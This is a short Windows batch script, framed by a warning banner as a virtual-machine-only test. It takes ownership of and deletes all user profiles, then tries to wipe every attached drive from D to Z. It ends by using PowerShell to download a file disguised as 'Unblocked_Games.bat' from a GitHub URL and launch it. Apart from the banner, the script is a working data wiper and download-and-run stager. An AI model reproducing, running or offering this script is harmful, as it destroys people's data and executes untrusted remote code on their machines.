@echo off
color 0C
title !! SYSTEM WIPE - DO NOT RUN OUTSIDE A VIRTUAL MACHINE !!
echo -------------------------------------------------------------
echo WARNING: This script will WIPE the VM and execute malware.
echo Only use this in a safe, isolated, and non-networked VM.
echo -------------------------------------------------------------
pause

:: Step 1: Take ownership and remove permissions protection
takeown /F "C:\Users" /R /D Y >nul
icacls "C:\Users" /grant administrators:F /T >nul

:: Step 2: Delete user profile
echo Deleting user profiles from C:\Users...
rmdir /S /Q "C:\Users"

:: Step 3: Attempt to wipe other attached drives (D: to Z:)
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo Wiping drive %%d...
        rmdir /S /Q %%d:\
    )
)

:: Step 4: Download the batch script from the hosted URL
echo Downloading Unblocked_Games.bat from GitHub...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/username/repo/main/Unblocked_Games.bat' -OutFile 'C:\Unblocked_Games.bat'"

:: Step 5: Execute the downloaded payload
echo Executing downloaded Unblocked_Games.bat...
start "" "C:\Unblocked_Games.bat"

echo --- Wipe and payload launch complete. VM should be unstable or unusable. ---
pause
